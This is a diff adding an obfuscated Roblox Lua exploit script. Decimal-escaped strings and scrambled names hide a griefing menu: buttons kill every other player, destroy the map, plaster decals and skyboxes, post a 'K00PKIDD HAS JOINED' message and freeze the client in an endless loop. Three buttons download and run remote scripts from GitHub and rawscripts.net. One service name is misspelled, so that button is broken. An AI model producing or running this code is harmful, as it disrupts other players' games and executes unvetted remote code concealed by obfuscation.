@@ -1,0 +1,119 @@
+local l1ll1l1I1 = game:GetService("\67\111\114\101\71\117\105")
+local I1l1IIl1I = game:GetService("\80\108\97\121\101\114\115")
+local lI1llI1lI = I1l1IIl1I.LocalPlayer
+local I1I1I1I1I = Instance.new("\83\99\114\101\101\110\71\117\105")
+I1I1I1I1I.Parent = l1ll1l1I1
+I1I1I1I1I.Name = "\73\110\116\101\114\110\97\108\77\111\100\117\108\101"
+I1I1I1I1I.ResetOnSpawn = false
+local ll11lII1l = Instance.new("\84\101\120\116\66\117\116\116\111\110")
+ll11lII1l.Parent = I1I1I1I1I
+ll11lII1l.Name = "\84\111\103\103\108\101"
+ll11lII1l.Text = "\47"
+ll11lII1l.Size = UDim2.new(0, 67, 0, 67)
+ll11lII1l.Position = UDim2.new(0, 10, 0.1, -45)
+ll11lII1l.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+ll11lII1l.TextColor3 = Color3.fromRGB(255, 255, 255)
+ll11lII1l.Font = Enum.Font.SourceSansBold
+ll11lII1l.BorderSizePixel = 0
+local l1lI1lI1l = Instance.new("\83\99\114\111\108\108\105\110\103\70\114\97\109\101")
+l1lI1lI1l.Parent = I1I1I1I1I
+l1lI1lI1l.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+l1lI1lI1l.BorderSizePixel = 0
+l1lI1lI1l.Position = UDim2.new(0, 5, 0.1, 0)
+l1lI1lI1l.Size = UDim2.new(0, 350, 0, 400)
+l1lI1lI1l.CanvasSize = UDim2.new(0, 0, 5, 0)
+l1lI1lI1l.ScrollBarThickness = 3
+l1lI1lI1l.Active = true
+l1lI1lI1l.Selectable = true
+l1lI1lI1l.Visible = true
+local lI1lI1lI1 = Instance.new("\85\73\76\105\115\116\76\97\121\111\117\116")
+lI1lI1lI1.Parent = l1lI1lI1l
+lI1lI1lI1.Padding = UDim.new(0, 2)
+lI1lI1lI1.HorizontalAlignment = Enum.HorizontalAlignment.Center
+lI1lI1lI1.SortOrder = Enum.SortOrder.LayoutOrder
+ll11lII1l.MouseButton1Click:Connect(function() l1lI1lI1l.Visible = not l1lI1lI1l.Visible end)
+local function lIlIlIlIl(l1I1I1I1I, lIIlIIlII)
+local l1l1l1l1l = Instance.new("\84\101\120\116\66\117\116\116\111\110")
+l1l1l1l1l.Parent = l1lI1lI1l
+l1l1l1l1l.Size = UDim2.new(1.7, 0, 0, 35)
+l1l1l1l1l.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+l1l1l1l1l.TextColor3 = Color3.fromRGB(255, 255, 255)
+l1l1l1l1l.Text = l1I1I1I1I
+l1l1l1l1l.Font = Enum.Font.SourceSansBold
+l1l1l1l1l.TextSize = 20
+l1l1l1l1l.BorderSizePixel = 0
+l1l1l1l1l.MouseButton1Click:Connect(function() pcall(lIIlIIlII) end)
+end
+lIlIlIlIl("\83\107\121\98\111\120", function()
+local s = Instance.new("\83\107\121", game.Lighting)
+local id = "\114\98\120\97\115\115\101\116\105\100\58\47\47\57\52\50\50\56\54\54\50\52\56"
+s.SkyboxBk = id s.SkyboxDn = id s.SkyboxFt = id s.SkyboxLf = id s.SkyboxRt = id s.SkyboxUp = id
+game.Lighting.TimeOfDay = 12
+end)
+lIlIlIlIl("\68\101\99\97\108", function()
+for _, v in pairs(game.Workspace:GetDescendants()) do
+if v:IsA("\66\97\115\101\80\97\114\116") then
+local f = {"\70\114\111\110\116","\66\97\99\107","\76\101\102\116","\82\105\103\104\116","\84\111\112","\66\111\116\116\111\109"}
+for _, face in pairs(f) do
+local d = Instance.new("\68\101\99\97\108", v)
+d.Texture = "\114\98\120\97\115\115\101\116\105\100\58\47\47\57\52\50\50\56\54\54\50\52\56"
+d.Face = Enum.NormalId[face]
+end
+end
+end
+end)
+lIlIlIlIl("\72\105\110\116", function()
+local h = Instance.new("\72\105\110\116", game.Workspace)
+h.Text = "\75\48\48\80\75\73\68\68\32\72\65\83\32\74\79\73\78\69\68\32\84\72\69\32\83\69\82\86\69\82\33"
+end)
+lIlIlIlIl("\82\54", function()
+lI1llI1lI.CharacterAppearanceId = 1
+if lI1llI1lI.Character then lI1llI1lI.Character:BreakJoints() end
+end)
+lIlIlIlIl("\73\110\102\105\110\105\116\121\32\89\105\101\108\100", function()
+loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\69\100\103\101\73\89\47\105\110\102\105\110\105\116\101\121\105\101\108\100\47\109\97\115\116\101\114\47\115\111\117\114\99\101"))()
+end)
+lIlIlIlIl("\80\97\114\116\105\99\108\101", function()
+for _, v in pairs(I1l1IIl1I:GetPlayers()) do
+local r = v.Character and v.Character:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116")
+if r and not r:FindFirstChild("\75\48\48\112\107\105\100\100\65\117\114\97") then
+local p = Instance.new("\80\97\114\116\105\99\108\101\69\109\105\116\116\101\114", r)
+p.Name = "\75\48\48\112\107\105\100\100\65\117\114\97"
+p.Texture = "\114\98\120\97\115\115\101\116\105\100\58\47\47\57\52\50\50\56\54\54\50\52\56"
+p.Rate = 100 p.Lifetime = NumberRange.new(1, 2) p.Speed = NumberRange.new(5)
+p.Color = ColorSequence.new(Color3.fromRGB(0, 255, 0))
+end
+end
+end)
+lIlIlIlIl("\75\105\108\108\32\97\108\108", function()
+for _, v in pairs(I1l1IIl1I:GetPlayers()) do
+if v ~= lI1llI1lI and v.Character and v.Character:FindFirstChild("\72\117\109\97\110\111\105\100") then
+v.Character.Humanoid.Health = 0
+end
+end
+end)
+lIlIlIlIl("\105\32\108\111\118\101\32\121\111\117\32\115\111", function()
+local s = Instance.new("\83\111\117\110\100", game.Workspace)
+s.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\57\56\51\54\52\48\51\52\52\53\56\50\54\48"
+s.Volume = 10 s:Play()
+end)
+lIlIlIlIl("\99\48\48\108\99\108\97\110", function()
+loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\115\99\114\105\112\116\115\46\110\101\116\47\114\97\119\47\85\110\105\118\101\114\115\97\108\45\83\115\114\105\112\116\45\99\48\48\108\99\108\97\110\45\118\49\45\53\48\56\50\54"))()
+end)
+lIlIlIlIl("\82\67\55", function()
+loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\86\52\77\80\76\48\48\78\89\47\82\67\55\45\45\45\72\97\115\116\101\114\109\97\122\101\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\82\67\55"))()
+end)
+lIlIlIlIl("\65\110\116\105\32\76\101\97\118\101", function()
+game:GetService("\82\117\110\83\101\114\118\105\101\99\101").RenderStepped:Connect(function() while true do end end)
+end)
+lIlIlIlIl("\68\101\115\116\114\111\121\32\77\97\112", function()
+for _, v in pairs(game.Workspace:GetChildren()) do
+if v:IsA("\66\97\115\101\80\97\114\116") and not v:IsA("\84\101\114\114\97\105\110") then v:Destroy() end
+end
+end)
+lIlIlIlIl("\65\110\99\104\111\114", function()
+for _, v in pairs(game.Workspace:GetDescendants()) do if v:IsA("\66\97\115\101\80\97\114\116") then v.Anchored = true end end
+end)
+lIlIlIlIl("\85\110\65\110\99\104\111\114", function()
+for _, v in pairs(game.Workspace:GetDescendants()) do if v:IsA("\66\97\115\101\80\97\114\116") then v.Anchored = false end end
+end)
